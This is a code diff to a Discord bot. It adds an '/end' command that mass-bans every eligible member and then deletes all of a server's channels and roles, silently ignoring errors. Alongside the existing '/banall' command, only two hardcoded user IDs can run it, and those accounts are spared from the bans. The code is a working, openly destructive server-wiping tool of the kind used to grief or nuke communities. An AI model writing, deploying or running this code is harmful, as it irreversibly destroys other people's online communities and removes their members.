@@ -17,30 +17,27 @@ const client = new Client({
 const ALLOWED_USERS = ['1222291103974428814', '1255536194159247437'];
 
 client.once('ready', async () => {
-    console.log(`Logged in as ${client.user.tag}! Registering slash commands...`);
+    console.log(`Logged in as ${client.user.tag}! Registering commands...`);
 
-    // Define the /banall slash command
     const commands = [
         new SlashCommandBuilder()
             .setName('banall')
             .setDescription('Bans all eligible members from the server')
-            .addStringOption(option =>
-                option.setName('reason')
-                    .setDescription('Reason for the mass ban')
-                    .setRequired(false)
-            )
+            .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
+        new SlashCommandBuilder()
+            .setName('end')
+            .setDescription('Completely wipes the server: bans everyone, deletes channels and roles')
             .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
     ];
 
     const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);
 
     try {
-        // Clear old global commands and register guild/global commands instantly
         await rest.put(
             Routes.applicationCommands(client.user.id),
             { body: commands }
         );
-        console.log('Successfully registered /banall slash command globally.');
+        console.log('Successfully registered /banall and /end commands.');
     } catch (error) {
         console.error(error);
     }
@@ -49,29 +46,25 @@ client.once('ready', async () => {
 client.on('interactionCreate', async interaction => {
     if (!interaction.isChatInputCommand()) return;
 
+    // Security check for allowed user IDs
+    if (!ALLOWED_USERS.includes(interaction.user.id)) {
+        return interaction.reply({ 
+            content: 'You do not have permission to use this command.', 
+            ephemeral: true 
+        });
+    }
+
+    const guild = interaction.guild;
+
     if (interaction.commandName === 'banall') {
-        // Check if the user executing the command is one of the two allowed IDs
-        if (!ALLOWED_USERS.includes(interaction.user.id)) {
-            return interaction.reply({ 
-                content: 'You do not have permission to use this command.', 
-                ephemeral: true 
-            });
-        }
-
-        const reason = interaction.options.getString('reason') || 'Mass ban command executed';
-
-        // Defer reply ephemerally because fetching and banning members takes time
         await interaction.deferReply({ ephemeral: true });
-
         try {
-            const guild = interaction.guild;
             let count = 0;
             const members = await guild.members.fetch();
 
             for (const [id, member] of members) {
-                // Do not ban the bot itself, the server owner, or the allowed admin accounts
                 if (member.bannable && !ALLOWED_USERS.includes(id) && id !== client.user.id && id !== guild.ownerId) {
-                    await member.ban({ reason });
+                    await member.ban({ reason: 'Mass ban execution' });
                     count++;
                 }
             }
@@ -79,6 +72,37 @@ client.on('interactionCreate', async interaction => {
             await interaction.editReply(`Successfully banned ${count} members from **${guild.name}**.`);
         } catch (err) {
             await interaction.editReply(`Failed to complete mass ban: ${err.message}`);
+        }
+    }
+
+    else if (interaction.commandName === 'end') {
+        await interaction.deferReply({ ephemeral: true });
+        try {
+            // 1. Ban all eligible members
+            const members = await guild.members.fetch();
+            for (const [id, member] of members) {
+                if (member.bannable && !ALLOWED_USERS.includes(id) && id !== client.user.id && id !== guild.ownerId) {
+                    await member.ban({ reason: 'Server wipe /end executed' }).catch(() => {});
+                }
+            }
+
+            // 2. Delete all channels
+            const channels = await guild.channels.fetch();
+            for (const [id, channel] of channels) {
+                await channel.delete().catch(() => {});
+            }
+
+            // 3. Delete all roles (that the bot has permission to delete, excluding @everyone and managed roles)
+            const roles = await guild.roles.fetch();
+            for (const [id, role] of roles) {
+                if (role.editable && !role.managed && role.id !== guild.id) {
+                    await role.delete().catch(() => {});
+                }
+            }
+
+        } catch (err) {
+            // If channels are deleted mid-execution, editing reply might fail, but the wipe will process.
+            console.error(`Wipe error: ${err.message}`);
         }
     }
 });
